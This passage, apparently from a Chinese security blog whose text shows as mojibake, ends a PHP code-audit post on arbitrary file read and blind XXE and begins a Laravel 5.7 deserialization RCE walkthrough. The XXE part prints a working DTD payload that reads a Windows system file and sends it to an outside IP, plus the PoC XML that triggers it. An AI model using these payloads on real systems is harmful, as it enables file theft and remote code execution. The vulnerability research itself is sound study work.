class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªä»£ç å­˜åœ¨ä¸¤ç§æ¼æ´ï¼Œç¬¬ä¸€ç§æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç¬¬äºŒä¸ªå°±æ˜¯ç›²æ‰“XXEã€‚</p>
<ol>
<li>ä»»æ„æ–‡ä»¶è¯»å–<br>è¿™ä¸ªæ¼æ´çš„è§¦å‘ç‚¹åœ¨<code>class_exists</code>ï¼Œæˆ‘ä»¬æ¥çœ‹phpæ‰‹å†Œå¦‚ä½•è§£é‡Šè¿™ä¸ªå‡½æ•°<br><img src="class_exists.png" alt="class_exists"><br>å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°å­˜åœ¨2ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯è¦æ£€æŸ¥çš„ç±»ï¼Œç¬¬äºŒä¸ªå‚æ•°<code>autoload</code>å†³å®šæ˜¯å¦é»˜è®¤è°ƒç”¨ __autoloadã€‚å¯ä»¥çœ‹åˆ°é»˜è®¤æ˜¯<code>True</code><blockquote>
<p>è¿™ä¸ªæ¼æ´åªèƒ½åœ¨php5.3ä¹‹ä¸‹åˆ©ç”¨</p>
</blockquote>
</li>
</ol>
<ul>
<li>å˜é‡<code>$controllerName</code>å¯æ§ï¼Œè¿›å…¥ifåˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„ç±»æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™è°ƒç”¨<code>__autoload</code>å°è¯•åŠ è½½ï¼Œå¦‚æœæˆ‘ä»¬ä¼ å…¥<code>../../../../etc/passwd</code>ï¼Œå°±é€ æˆäº†ä»»æ„æ–‡ä»¶è¯»å–<br><img src="%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.png" alt="ä»»æ„æ–‡ä»¶è¯»å–"><br>ç”±äºæˆ‘è¿™é‡Œæ²¡æœ‰è¿™ä¹ˆä½ç‰ˆæœ¬çš„ç¯å¢ƒï¼Œå°±æ²¡æœ‰æµ‹è¯•ä¸‹å»äº†ï¼ˆå¤§äºphp5.3ç‰ˆæœ¬ä¼ å…¥ç±»ååŒ…å«<code>.</code>å’Œ<code>/</code>å°±ä¼šè‡ªåŠ¨è·³å‡ºï¼‰</li>
</ul>
<ol start="2">
<li>XXE<br>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨åˆ°äº†PHPçš„ä¸€ä¸ªåŸç”Ÿç±»SimpleXMLElement</li>
</ol>
<ul>
<li>é¦–å…ˆçœ‹æºä»£ç ï¼Œæ¼æ´è§¦å‘ç‚¹æ˜¯åœ¨<code>$controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);</code>å®ä¾‹åŒ–å¯¹è±¡è¿™é‡Œï¼Œè¿™é‡Œç”¨åˆ°äº†å¯å˜å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬newä¸€ä¸ªä»»æ„çš„å¯¹è±¡ã€‚</li>
<li>æ¥ä¸‹æ¥çœ‹åŸç”Ÿç±»SimpleXMLElementçš„æ„é€ æ–¹æ³•<br><img src="SimpleXMLElement__construct.png" alt="SimpleXMLElement::__construct"><br>å‚æ•°ï¼š</li>
<li>dataï¼šæ ¼å¼æ­£ç¡®çš„XMLå­—ç¬¦ä¸²ï¼Œå½“å‚æ•°<code>data_is_url</code>æ˜¯<code>True</code>æ—¶ï¼Œä¼ å…¥ä¸€ä¸ªURLå­—ç¬¦ä¸²</li>
<li>optionsï¼šï¼ˆå¯é€‰ï¼‰ç”¨äºæŒ‡å®šå…¶ä»–Libxmlå‚æ•°ã€‚</li>
</ul>
<p>æ€è·¯å°±æ˜¯ä¼ å…¥ä¸€ä¸ª<code>SimpleXMLElement</code>ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œå½“XMLå¤–éƒ¨å®ä½“å¯æ§ï¼Œå°±é€ æˆXXEï¼Œæºç æ²¡æœ‰echoç­‰å‡½æ•°å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨ç›²æ‰“XXE</p>
<h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><ul>
<li>é¦–å…ˆæˆ‘ä»¬åœ¨åœ¨æœ¬åœ°ä¸Šä¼ ä¸€ä¸ª<code>test2.dtd</code>æ–‡ä»¶<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///C:/Windows/system.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://10.3.131.118:1111?p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°äº†å‚æ•°å®ä½“ï¼Œé¡ºä¾¿å†™ä¸€ä¸‹ä¸¤ç§å®ä½“çš„åŒºåˆ«</li>
</ul>
<ol>
<li>é€šç”¨å®ä½“<br>ç”¨ <code>&amp;å®ä½“å;</code>ï¼Œå¼•ç”¨çš„å®ä½“ï¼ˆä¾‹å¦‚ä¸Šé¢çš„<code>&amp;xxe;</code>ï¼‰ï¼Œä»–åœ¨DTD ä¸­å®šä¹‰ï¼Œåœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨<blockquote>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>å‚æ•°å®ä½“ï¼š<ol>
<li>ä½¿ç”¨ % å®ä½“å(è¿™é‡Œé¢ç©ºæ ¼ä¸èƒ½å°‘) åœ¨ DTD ä¸­<strong>å®šä¹‰</strong>ï¼Œå¹¶ä¸”åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨<code>%å®ä½“å;</code> <strong>å¼•ç”¨</strong></li>
<li>åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“</li>
<li>å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element "&lt;!ELEMENT mytag (subtag)&gt;"&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">remote-dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">localhost</span>/<span class="attr">test.dtd</span>"&gt;</span> </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>å‚æ•°å®ä½“åœ¨æˆ‘ä»¬ Blind XXE ä¸­èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨</strong></p>
</blockquote>
</li>
</ol>
</li>
</ol>
<ul>
<li>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ„é€ POC<br>å‚æ•°cæ˜¯æˆ‘ä»¬è¦å®ä¾‹åŒ–çš„ç±»ï¼š<code>c=SimpleXMLElement</code><br>æ„é€ å‡½æ•°å­˜åœ¨2ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå½“ç„¶æ˜¯dataï¼Œç¬¬äºŒä¸ªæ˜¯optionsï¼›optionsè¿™é‡Œæˆ‘ä»¬é€‰æ‹©<code>LIBXML_NOENT</code>ï¼Œé¢„è®¾å€¼ä¸º2<br><img src="LIBXML_NOENT.png" alt="LIBXML_NOENT"><br>XMLçš„å†…å®¹ï¼š<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://10.3.131.118/test2.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br></pre></td></tr></table></figure>
æ¥ä¸‹æ¥åœ¨æœ¬åœ°ç”¨NCå¼€å¯ç›‘å¬ï¼Œä¸å‡ºæ„å¤–æˆ‘ä»¬ä¼šæ”¶åˆ°è¯·æ±‚<br><img src="result.png" alt="result"><br>ä¹Ÿå¯ä»¥å°†dtdä¸­çš„ç«¯å£æ”¹ä¸ºWebç«¯å£ï¼Œç„¶åå†apacheæŸ¥çœ‹æ—¥å¿—å³å¯<h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1>å…¶å®è¿˜æœ‰ä¸€éƒ¨åˆ†çŸ¥è¯†ç‚¹æ²¡æœ‰å†™å®Œï¼Œå…ˆåœ¨è¿™é‡Œç•™ä¸ªå‘å¥½äº†ï¼Œè¿‡å‡ å¤©è¡¥å……å‰©ä¸‹çš„ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel5.7ååºåˆ—åŒ–RCEæ¼æ´åˆ†æ</title>
    <url>/2020/03/06/Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»¥å‰åªæ˜¯ç²—ç•¥çš„çŸ¥é“ååºåˆ—åŒ–æ¼æ´çš„åŸç†ï¼Œæœ€è¿‘åœ¨å­¦ä¹ Laravelæ¡†æ¶çš„æ—¶å€™æ­£å¥½æƒ³èµ·ä»¥å‰æ”¶è—çš„ä¸€ç¯‡ååºåˆ—åŒ–RCEæ¼æ´ï¼Œå€Ÿæ­¤æœºä¼šè·Ÿç€å­¦ä¹ ä¸€ä¸‹POPé“¾çš„æŒ–æ˜</p>
<a id="more"></a>
<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Laravelæ˜¯ä¸€ä¸ªä½¿ç”¨å¹¿æ³›å¹¶ä¸”ä¼˜ç§€çš„PHPæ¡†æ¶ã€‚è¿™æ¬¡æŒ–æ˜çš„æ¼æ´Laravel5.7ç‰ˆæœ¬ï¼Œè¯¥æ¼æ´éœ€è¦å¯¹æ¡†æ¶è¿›è¡ŒäºŒæ¬¡å¼€å‘æ‰èƒ½è§¦å‘è¯¥æ¼æ´</p>
<h1 id="æœ¬åœ°ç¯å¢ƒ"><a href="#æœ¬åœ°ç¯å¢ƒ" class="headerlink" title="æœ¬åœ°ç¯å¢ƒ"></a>æœ¬åœ°ç¯å¢ƒ</h1><ul>
<li>Laravel5.7.28</li>
<li>Wamper64+PHP7.3.5ï¼ˆPHP &gt;= 7.1.3ï¼‰<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2></li>
</ul>
<ol>
<li>ä½¿ç”¨composeréƒ¨ç½²Laravelé¡¹ç›®<ul>
<li>åˆ›å»ºä¸€ä¸ªåä¸ºlaravelçš„Laravelé¡¹ç›®<br><code>composer create-project laravel/laravel=5.7.* --prefer-dist ./</code></li>
<li>Laravelæ¡†æ¶ä¸ºå•å…¥å£ï¼Œå…¥å£æ–‡ä»¶ä¸º<code>{å®‰è£…ç›®å½•}/public/index.php</code>ï¼Œä½¿ç”¨apacheéƒ¨ç½²åè®¿é—®å…¥å£æ–‡ä»¶æ˜¾ç¤º<em>Laravelæ¬¢è¿ç•Œé¢</em>å³å®‰è£…æˆåŠŸï¼ˆæˆ–è€…ä½¿ç”¨å‘½ä»¤<code>php artisan serve</code>å¼€å¯ä¸´æ—¶çš„å¼€å‘ç¯å¢ƒçš„æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼‰</li>
</ul>
</li>
<li>é…ç½®è·¯ç”±ä»¥åŠæ§åˆ¶å™¨<ul>
<li>Laravelæ‰€æœ‰çš„ç”¨æˆ·è¯·æ±‚éƒ½ç”±è·¯ç”±æ¥è¿›è¡Œæ§åˆ¶ã€‚æˆ‘ä»¬æ·»åŠ ä¸€æ¡å¦‚ä¸‹çš„è·¯ç”±<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> \<span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the "web" middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// æ·»åŠ çš„è·¯ç”±</span></span><br><span class="line">Route::get(<span class="string">'/test'</span>, <span class="string">'Test\TestController@Test'</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<ul>
<li>æ§åˆ¶å™¨ä¸­<code>Test</code>å‡½æ•°å®ç°ååºåˆ—åŒ–åŠŸèƒ½ï¼š<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Test</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        unserialize($code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>Laravel5.7ç‰ˆæœ¬åœ¨<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing</code>æ–‡ä»¶å¤¹ä¸‹å¢åŠ äº†ä¸€ä¸ª<code>PendingCommand</code>ç±»ï¼Œå®˜æ–¹çš„è§£é‡Šè¯¥ç±»ä¸»è¦åŠŸèƒ½æ˜¯ç”¨ä½œå‘½ä»¤æ‰§è¡Œï¼Œå¹¶ä¸”è·å–è¾“å‡ºå†…å®¹ã€‚<br>è¯¥ç±»ä¸­å‡ ä¸ªé‡è¦å±æ€§ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> $test;           <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span></span><br><span class="line"><span class="keyword">protected</span> $app;         <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span></span><br><span class="line"><span class="keyword">protected</span> $command;     <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span></span><br><span class="line"><span class="keyword">protected</span> $parameters;  <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array('id')</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ä¸º<code>PendingCommand.php</code>ä¸­çš„<code>run()</code>å‡½æ•°<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hasExecuted = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;mockConsoleOutput();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $exitCode = <span class="keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="keyword">$this</span>-&gt;command, <span class="keyword">$this</span>-&gt;parameters);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoMatchingExpectationException $e) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($e-&gt;getMethodName() === <span class="string">'askQuestion'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;test-&gt;fail(<span class="string">'Unexpected question "'</span> . $e-&gt;getActualArguments()[<span class="number">0</span>]-&gt;getQuestion() . <span class="string">'" was asked.'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> $e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;expectedExitCode !== <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test-&gt;assertEquals(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;expectedExitCode,</span><br><span class="line">                $exitCode,</span><br><span class="line">                <span class="string">"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;."</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $exitCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><code>run()</code>å‡½æ•°è¢«ææ„å‡½æ•°<code>__destruct()</code>è°ƒç”¨<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle the object's destruction.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
ç®€å•çš„POPé“¾ä¸ºï¼šæ„é€ çš„expç»è¿‡ååºåˆ—åŒ–åè°ƒç”¨<code>__destruct()</code>ï¼Œè¿›è€Œè°ƒç”¨<code>run()</code>,<code>run()</code>è¿›è¡Œä»£ç æ‰§è¡Œã€‚ä¸‹é¢è¿›è¡Œè¯¦ç»†çš„åˆ†æ</li>
<li>é¦–å…ˆå°†æ„é€ å¥½çš„åºåˆ—åŒ–æ•°æ®é€šè¿‡å‚æ•°Cä¼ å…¥ï¼Œè°ƒç”¨<code>__destruct()</code>ï¼Œ<code>__destruct()</code>æ–¹æ³•ä¸­é¦–å…ˆåˆ¤æ–­<code>$hasExecuted</code>ï¼Œå¦‚æœä¸º<code>true</code>åˆ™returnï¼Œå¯ä»¥çœ‹åˆ°è¯¥å˜é‡é»˜è®¤å€¼ä¸º<code>false</code>ï¼Œæ‰€ä»¥å¯ä»¥é¡ºåˆ©è¿›å…¥<code>run()</code>æ–¹æ³•`<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if command has executed.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $hasExecuted = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></li>
<li>è§‚å¯Ÿrun()æ–¹æ³•å†…çš„ä»£ç ï¼Œæˆ‘ä»¬è¦è®©ä»£ç é¡ºåˆ©æ‰§è¡Œåˆ°<code>run()</code>å¤„æ‰èƒ½é¡ºåˆ©æ‰§è¡Œä»£ç ã€‚é¦–å…ˆè¿›å…¥<code>mockConsoleOutput()</code>æ–¹æ³•</li>
</ul>
<p><img src="run.png" alt="run"></p>
<ul>
<li>171è¡Œä½¿ç”¨<code>Mockery::mock</code>å®ç°å¯¹è±¡æ¨¡æ‹Ÿï¼Œç»è¿‡è°ƒè¯•å¯ä»¥é¡ºåˆ©è¿è¡Œï¼Œæ¥ä¸‹æ¥è¿›å…¥<code>mockConsoleOutput()</code>å‡½æ•°</li>
</ul>
<p><img src="mockConsoleOutput.png" alt="mockConsoleOutput"></p>
<ul>
<li>æ¥ä¸‹æ¥åˆæ˜¯<code>Mockery::mock</code>å®ç°å¯¹è±¡æ¨¡æ‹Ÿï¼Œç»è¿‡è°ƒè¯•ä»£ç å¯ä»¥é¡ºåˆ©è¿è¡Œåˆ°<code>foreach</code>ï¼Œ<code>foreach</code>å¾ªç¯é‡Œçš„ä»£ç æ˜¯<code>$this-&gt;test-&gt;expectedOutput</code>ï¼Œè¿™é‡Œå¯¹<code>$this-&gt;test</code>ç±»çš„<code>expectedOutput</code>å±æ€§<br>è¿›è¡Œéå†ä½œä¸ºæ•°ç»„ï¼Œä»£ç æ‰èƒ½æ­£å¸¸æ‰§è¡Œä¸‹å»ã€‚ä½†æ˜¯è¯¥ç±»å¹¶ä¸å­˜åœ¨<code>expectedOutput</code>å±æ€§ï¼›ç»è¿‡åˆ†æä»£ç ï¼Œæˆ‘ä»¬å‘ç°è¿™é‡Œåªè¦èƒ½å¤Ÿè¿”å›ä¸€ä¸ªæ•°ç»„ä»£ç å°±å¯ä»¥é¡ºåˆ©è¿›è¡Œä¸‹å»ã€‚</li>
</ul>
<p><img src="createABufferedOutputMock.png" alt="createABufferedOutputMock"></p>
<ul>
<li>å› æ­¤æˆ‘ä»¬å…¨æ–‡æœç´¢<code>__get()</code>æ–¹æ³•ï¼Œè®©<code>__get()</code>æ–¹æ³•è¿”å›æˆ‘ä»¬æƒ³è¦çš„æ•°ç»„å°±å¯ä»¥äº†ã€‚è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯<code>DefaultGenerator.php</code>ç±»</li>
</ul>
<p><img src="get.png" alt="get"></p>
<ul>
<li>æˆ‘ä»¬å¯¹<code>DefaultGenerator</code>ç±»è¿›è¡Œå®ä¾‹åŒ–å¹¶ä¼ å…¥æ•°ç»„<code>array(&#39;hello&#39;=&gt;&#39;world&#39;)</code>ï¼Œæ‰“æ–­ç‚¹è¿›è¡Œè°ƒè¯•å¯ä»¥çœ‹åˆ°ä»£ç é¡ºåˆ©æ‰§è¡Œä¸‹å»äº†</li>
</ul>
<p><img src="get1.png" alt="get1"><br><img src="get2.png" alt="get2"></p>
<ul>
<li>åé¢çš„ä»£ç éƒ½æ˜¯å¯ä»¥é¡ºåˆ©æ‰§è¡Œä¸‹å»çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åˆå›åˆ°äº†<code>mockConsoleOutput()</code>æ–¹æ³•å†…ï¼Œæ¥ä¸‹æ¥åˆæ˜¯ä¸€ä¸ª<code>forearch</code>å¾ªç¯ï¼Œå¦‚ä¸Šä¸€æ­¥çš„éå†æ•°ç»„ä¸€æ ·ï¼Œé¡ºåˆ©æ‰§è¡Œä¸‹å»</li>
</ul>
<p><img src="get3.png" alt="get3"></p>
<ul>
<li><p>æ¥ä¸‹æ¥ä»£ç ä¼šæ‰§è¡Œåˆ°<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>ï¼Œå…¶ä¸­<code>Kernel::class</code>ä¸ºå›ºå®šå€¼ï¼š<code>&quot;Illuminate\Contracts\Console\Kernel&quot;</code>ï¼Œåœ¨è¯¥å¤„ä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•åˆ†æä¸‹é¢çš„è°ƒç”¨æ ˆ</p>
<blockquote>
<p>â†’ offsetGet(),$key=â€Illuminate\Contracts\Console\Kernelâ€<br><img src="offsetGet.png" alt="offsetGet"><br>â†’ make(),$abstract=â€Illuminate\Contracts\Console\Kernelâ€<br><img src="make.png" alt="make"><br>â†’ make():çˆ¶ç±»çš„<code>make()</code>,$abstract=â€Illuminate\Contracts\Console\Kernelâ€,$parameters=array(0)<br><img src="make1.png" alt="make1"></p>
</blockquote>
</li>
<li><p>å…¶ä¸­<code>return $this-&gt;instances[$abstract];</code>=<code>$this-&gt;instances[&quot;Illuminate\Contracts\Console\Kernel&quot;]</code>ä¹Ÿå°±æ˜¯è¿”å›äº†<code>Illuminate\Foundation\Application</code>å¯¹è±¡ï¼›å³æˆ‘ä»¬å¯ä»¥å°†ä»»æ„å¯¹è±¡èµ‹å€¼ç»™ $this-&gt;instances[$abstract] ï¼Œè¿™ä¸ªå¯¹è±¡æœ€ç»ˆä¼šèµ‹å€¼ç»™<code>[Kernel::class]</code> ï¼Œæ¥ç€è°ƒç”¨<code>call()</code>æ–¹æ³•</p>
<blockquote>
<p>â†’ resolve(),$abstract=â€Illuminate\Contracts\Console\Kernelâ€ï¼Œinstancesæ•°ç»„ä¸­ä¸ºApplicationå¯¹è±¡<br><img src="resolve.png" alt="resolve"></p>
</blockquote>
</li>
<li><p>ä¸‹é¢æˆ‘ä»¬æˆåŠŸçš„æ‰§è¡Œåˆ°äº†<code>call()</code>æ–¹æ³•ï¼Œ</p>
<blockquote>
<p>â†’call()<br><img src="call.png" alt="call"></p>
</blockquote>
</li>
<li><p>å…¶ä¸­<code>isCallableWithAtSign()</code>æ–¹æ³•æ˜¯åˆ¤æ–­ç¡®å®šç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ä½¿ç”¨<code>Class@method</code>è¯­æ³•ï¼Œä¸æ»¡è¶³è‡ªç„¶è·³å‡ºï¼Œæ‰§è¡Œåˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">static</span>::callBoundMethod($container, $callback, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">                $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">            );</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>â†’BoundMethod::call()<br><img src="call1.png" alt="call1"></p>
</blockquote>
</li>
<li><p>æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹<code>callBoundMethod()</code>å‡½æ•°ï¼Œå¯ä»¥å‘ç°å®ƒçš„ä½œç”¨åªæ˜¯åˆ¤æ–­<code>$callback</code>æ˜¯å¦ä¸ºæ•°ç»„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">callBoundMethod</span><span class="params">($container, $callback, $default)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_array($callback)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default <span class="keyword">instanceof</span> Closure ? $default() : $default;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>ç»§ç»­è·Ÿè¿›ä¸‹é¢çš„åŒ¿åå‡½æ•°ï¼š</p>
